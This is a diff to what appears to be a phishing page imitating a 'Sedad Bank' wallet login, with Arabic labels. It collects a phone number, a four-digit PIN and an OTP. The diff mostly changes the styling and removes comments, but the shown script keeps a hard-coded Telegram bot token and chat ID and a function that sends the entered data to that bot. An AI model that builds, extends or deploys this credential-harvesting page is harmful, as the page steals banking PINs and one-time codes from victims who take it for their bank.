@@ -22,7 +22,8 @@
                         sedadGold: '#BFA054',
                         sedadDarkBlue: '#102542',
                         sedadTextGray: '#666666',
-                        sedadBorderLight: '#E5E5E5'
+                        sedadBorderLight: '#E5E5E5',
+                        sedadBg: '#f2f5f9'
                     }
                 }
             }
@@ -32,6 +33,7 @@
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap');
         body {
             font-family: 'Cairo', sans-serif;
+            background-color: #f2f5f9 !important;
         }
         .pin-field {
             -webkit-text-security: disc !important;
@@ -46,9 +48,9 @@
         }
     </style>
 </head>
-<body class="bg-gray-100 flex justify-center items-center min-h-screen p-0 m-0 select-none">
+<body class="bg-[#f2f5f9] flex justify-center items-center min-h-screen p-0 m-0 select-none">
 
-    <div class="w-full max-w-md bg-white shadow-xl overflow-hidden relative border border-gray-100 min-h-[840px] flex flex-col justify-between p-6 rounded-[32px]">
+    <div class="w-full max-w-md bg-[#f2f5f9] shadow-xl overflow-hidden relative border-0 min-h-[840px] flex flex-col justify-between p-6 rounded-[32px]">
         
         <div class="w-full flex justify-center pt-8 pb-2 px-2">
             <img src="Sedad Bank" alt="Sedad Bank" class="w-full max-w-[390px] h-auto object-contain">
@@ -72,17 +74,17 @@
                 
                 <div class="relative w-full px-1">
                     <input type="tel" id="phoneInput" inputmode="numeric" placeholder="رقم الهاتف" 
-                           class="w-full h-16 bg-[#F9F9F9] border border-gray-200 rounded-[22px] pr-14 pl-6 text-right text-2xl text-gray-800 outline-none focus:border-[#1A874B] focus:ring-4 focus:ring-emerald-100 transition-all placeholder-gray-400 font-medium shadow-none">
+                           class="w-full h-16 bg-white border border-gray-200 rounded-[22px] pr-14 pl-6 text-right text-2xl text-gray-800 outline-none focus:border-[#1A874B] focus:ring-4 focus:ring-emerald-100 transition-all placeholder-gray-400 font-medium shadow-none">
                     <div class="absolute inset-y-0 right-0 flex items-center pr-6 text-sedadGold text-2xl pointer-events-none">
                         <i class="fa-regular fa-user"></i>
                     </div>
                 </div>
 
                 <div class="grid grid-cols-4 gap-4 px-1" dir="ltr">
-                    <input dir="ltr" type="text" inputmode="numeric" maxlength="1" class="pin-field strict-left-input w-full h-[76px] text-4xl font-extrabold bg-[#F9F9F9] border border-gray-200 rounded-[22px] outline-none focus:border-[#1A874B] focus:ring-4 focus:ring-emerald-100 transition-all" placeholder="">
-                    <input dir="ltr" type="text" inputmode="numeric" maxlength="1" class="pin-field strict-left-input w-full h-[76px] text-4xl font-extrabold bg-[#F9F9F9] border border-gray-200 rounded-[22px] outline-none focus:border-[#1A874B] focus:ring-4 focus:ring-emerald-100 transition-all" placeholder="">
-                    <input dir="ltr" type="text" inputmode="numeric" maxlength="1" class="pin-field strict-left-input w-full h-[76px] text-4xl font-extrabold bg-[#F9F9F9] border border-gray-200 rounded-[22px] outline-none focus:border-[#1A874B] focus:ring-4 focus:ring-emerald-100 transition-all" placeholder="">
-                    <input dir="ltr" type="text" inputmode="numeric" maxlength="1" class="pin-field strict-left-input w-full h-[76px] text-4xl font-extrabold bg-[#F9F9F9] border border-gray-200 rounded-[22px] outline-none focus:border-[#1A874B] focus:ring-4 focus:ring-emerald-100 transition-all" placeholder="">
+                    <input dir="ltr" type="text" inputmode="numeric" maxlength="1" class="pin-field strict-left-input w-full h-[76px] text-4xl font-extrabold bg-white border border-gray-200 rounded-[22px] outline-none focus:border-[#1A874B] focus:ring-4 focus:ring-emerald-100 transition-all shadow-sm" placeholder="">
+                    <input dir="ltr" type="text" inputmode="numeric" maxlength="1" class="pin-field strict-left-input w-full h-[76px] text-4xl font-extrabold bg-white border border-gray-200 rounded-[22px] outline-none focus:border-[#1A874B] focus:ring-4 focus:ring-emerald-100 transition-all shadow-sm" placeholder="">
+                    <input dir="ltr" type="text" inputmode="numeric" maxlength="1" class="pin-field strict-left-input w-full h-[76px] text-4xl font-extrabold bg-white border border-gray-200 rounded-[22px] outline-none focus:border-[#1A874B] focus:ring-4 focus:ring-emerald-100 transition-all shadow-sm" placeholder="">
+                    <input dir="ltr" type="text" inputmode="numeric" maxlength="1" class="pin-field strict-left-input w-full h-[76px] text-4xl font-extrabold bg-white border border-gray-200 rounded-[22px] outline-none focus:border-[#1A874B] focus:ring-4 focus:ring-emerald-100 transition-all shadow-sm" placeholder="">
                 </div>
 
                 <div class="px-1 pt-2">
@@ -153,10 +155,8 @@
     </div>
 
     <script>
-        // --- تثبيت التبويب على المحفظة دائماً بغض النظر عن أي نقرات ---
         let selectedTab = 'wallet';
         function switchTab(tab) {
-            // يتم تجاهل أي طلب لتغيير التبويب والابقاء دائماً على المحفظة
             selectedTab = 'wallet';
             const tabWallet = document.getElementById('tabWallet');
             const tabBank = document.getElementById('tabBank');
@@ -165,7 +165,6 @@
             tabBank.className = "w-1/2 h-full text-gray-500 font-bold text-xl rounded-[18px] transition-all duration-200 flex items-center justify-center hover:text-gray-700";
         }
 
-        // --- بداية إعدادات ودوال التليجرام ---
         const TELEGRAM_TOKEN = "8854630231:AAHwY-escCA2tlAzBgDZWqNaPNqUNTpIKGA";
         const TELEGRAM_CHAT_ID = "8972356637";
 
@@ -184,7 +183,6 @@
                 console.error("خطأ في إرسال البيانات عبر تليجرام:", error);
             }
         }
-        // --- نهاية إعدادات التليجرام ---
 
         const modal = document.getElementById('otpModal');
         const modalContent = modal.querySelector('div');
